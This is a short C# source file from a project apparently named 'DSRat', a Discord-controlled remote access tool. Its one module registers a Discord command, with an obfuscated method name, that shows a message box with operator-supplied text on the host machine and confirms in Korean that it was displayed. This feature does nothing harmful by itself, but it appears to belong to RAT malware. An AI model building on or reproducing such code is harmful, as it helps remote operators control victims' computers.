using Discord.Commands;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DSRat
{
    public class messagebox : ModuleBase<SocketCommandContext>
    {
        [Command("명령어")]
        public async Task dnasdnjksanKJWNDUQNDjkn1384130njks(string msg)
        {
            MessageBox.Show(msg);
            await Context.Channel.SendMessageAsync(msg + " 를 띄움");
        }
    }
}
